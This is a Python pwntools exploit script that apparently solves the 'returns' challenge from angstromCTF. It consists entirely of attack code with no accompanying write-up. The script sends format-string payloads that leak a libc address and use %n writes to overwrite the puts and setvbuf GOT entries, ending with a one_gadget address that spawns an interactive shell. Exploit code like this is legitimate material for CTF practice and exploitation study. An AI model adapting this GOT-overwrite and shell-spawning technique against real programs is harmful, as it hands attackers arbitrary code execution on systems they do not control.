from pwn import *
import struct

context.binary = "./returns"
context.terminal = "/bin/bash"

e = ELF("./returns")
libc = ELF("./libc.so.6")
p = e.process(env={"LD_PRELOAD": libc.path})
# p = remote("shell.actf.co", 19307)
# gdb.attach(p)

# this is necessary because the program sets the final byte of the payload to null so this messes with addresses
def fix_final_byte(addr):
    result = ""
    is_set = False
    for b in addr:
        if b == "\x00" and not is_set:
            result += "\xff"
            is_set = True
        else:
            result += b
    return result


def pad(s):
    return s + "A" * (50 - len(s) - 10)

puts_addr = e.got["puts"]
setvbuf_addr = e.got["setvbuf"]
main_addr = e.symbols["main"]
middle_of_main = e.symbols["main"] + 0x77

p.readuntil("? ")

# leak libc and overwrite puts to be the middle of main
payload1 = ""
payload1 += "%6$018p"
payload1 += "%" + str(middle_of_main - 18) + "x" # subtract 18 because 18 characters are printed by the libc leak before this
payload1 += "%13$lln"
payload1 = pad(payload1)
payload1 += fix_final_byte(p64(puts_addr))

p.sendline(payload1)

res = p.readuntil("? ")[21 + 2:21 + 18]
libc_leak = int(res, 16)
LIBC_BASE = libc_leak - 0x227168
log.info("LIBC_BASE: " + hex(LIBC_BASE))

ONE_GADGET = 0xf1147
log.info("writing: " + hex(LIBC_BASE + ONE_GADGET))
write = p64(LIBC_BASE + ONE_GADGET)

# now that we have printf being called again, overwrite setvbuf to one gadget
writes_done = 0
print hexdump(write)
for i, b in enumerate(write):
    print b, i
    
    if b != "\x00":
        byte_write = ""
        byte_write += "%" + str(ord(b)) + "x"
        byte_write += "%" + str(15 + writes_done) + "$hhn"
        byte_write = pad(byte_write)
        byte_write += fix_final_byte(p64(setvbuf_addr + i))

        log.info(hexdump(byte_write))
        p.sendline(byte_write)
        writes_done += 1
        p.readuntil("? ")

# write puts to be the start of main
rewrite_main = ""
rewrite_main += "%" + str(main_addr) + "x"
rewrite_main += "%" + str(15 + writes_done) + "$lln"
rewrite_main = pad(rewrite_main)
rewrite_main += fix_final_byte(p64(puts_addr))

print("rewriting puts to be main")
p.sendline(rewrite_main)
p.readuntil("? ")

p.interactive()